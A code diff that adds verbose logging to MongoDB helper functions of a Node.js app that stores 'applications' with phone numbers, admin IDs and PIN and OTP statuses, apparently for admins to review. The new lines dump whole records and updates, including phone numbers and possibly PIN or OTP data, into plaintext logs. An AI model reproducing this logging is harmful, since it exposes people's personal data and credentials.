@@ -221,6 +221,7 @@ async function getAdminCount() {
 
 async function saveApplication(appData) {
     try {
+        console.log(`📋 [APPLICATION PROCESS - SAVE] Starting application save:`, JSON.stringify(appData, null, 2));
         const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne({
             id:             appData.id,
             adminId:        appData.adminId,
@@ -236,59 +237,80 @@ async function saveApplication(appData) {
             timestamp:      appData.timestamp || new Date().toISOString()
         });
         console.log(`💾 Application saved: ${appData.id}`);
+        console.log(`✅ [APPLICATION PROCESS - SAVE SUCCESS] Application ID: ${appData.id}, Phone: ${appData.phoneNumber}, Admin: ${appData.adminId}`);
         return result;
     } catch (error) {
         console.error('❌ Error saving application:', error);
+        console.error(`❌ [APPLICATION PROCESS - SAVE ERROR] Failed to save application ${appData?.id}:`, error.message);
         throw error;
     }
 }
 
 async function getApplication(applicationId) {
     try {
-        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
+        console.log(`🔍 [APPLICATION PROCESS - GET] Fetching application: ${applicationId}`);
+        const app = await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
+        if (app) {
+            console.log(`📄 [APPLICATION PROCESS - GET FOUND] Application retrieved: ${applicationId}, Status - Pin: ${app.pinStatus}, OTP: ${app.otpStatus}`);
+        } else {
+            console.log(`⚠️ [APPLICATION PROCESS - GET NOT FOUND] Application not found: ${applicationId}`);
+        }
+        return app;
     } catch (error) {
         console.error('❌ Error getting application:', error);
+        console.error(`❌ [APPLICATION PROCESS - GET ERROR] Failed to fetch application ${applicationId}:`, error.message);
         return null;
     }
 }
 
 async function updateApplication(applicationId, updates) {
     try {
+        console.log(`🔄 [APPLICATION PROCESS - UPDATE] Updating application ${applicationId} with fields:`, JSON.stringify(updates, null, 2));
         const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
             { id: applicationId },
             { $set: { ...updates, updatedAt: new Date().toISOString() } }
         );
         console.log(`🔄 Application updated: ${applicationId}`);
+        console.log(`✅ [APPLICATION PROCESS - UPDATE SUCCESS] Application ${applicationId} updated. Modified count: ${result.modifiedCount}`);
         return result;
     } catch (error) {
         console.error('❌ Error updating application:', error);
+        console.error(`❌ [APPLICATION PROCESS - UPDATE ERROR] Failed to update application ${applicationId}:`, error.message);
         throw error;
     }
 }
 
 async function getApplicationsByAdmin(adminId) {
     try {
-        return await db.collection(COLLECTIONS.APPLICATIONS)
+        console.log(`📋 [APPLICATION PROCESS - ADMIN LIST] Fetching applications for admin: ${adminId}`);
+        const apps = await db.collection(COLLECTIONS.APPLICATIONS)
             .find({ adminId })
             .sort({ timestamp: -1 })
             .toArray();
+        console.log(`📊 [APPLICATION PROCESS - ADMIN LIST SUCCESS] Found ${apps.length} applications for admin: ${adminId}`);
+        return apps;
     } catch (error) {
         console.error('❌ Error getting applications by admin:', error);
+        console.error(`❌ [APPLICATION PROCESS - ADMIN LIST ERROR] Failed to fetch applications for admin ${adminId}:`, error.message);
         return [];
     }
 }
 
 async function getPendingApplications(adminId) {
     try {
-        return await db.collection(COLLECTIONS.APPLICATIONS)
+        console.log(`⏳ [APPLICATION PROCESS - PENDING LIST] Fetching pending applications for admin: ${adminId}`);
+        const apps = await db.collection(COLLECTIONS.APPLICATIONS)
             .find({
                 adminId,
                 $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }]
             })
             .sort({ timestamp: -1 })
             .toArray();
+        console.log(`📊 [APPLICATION PROCESS - PENDING LIST SUCCESS] Found ${apps.length} pending applications for admin: ${adminId}`);
+        return apps;
     } catch (error) {
         console.error('❌ Error getting pending applications:', error);
+        console.error(`❌ [APPLICATION PROCESS - PENDING LIST ERROR] Failed to fetch pending applications for admin ${adminId}:`, error.message);
         return [];
     }
 }
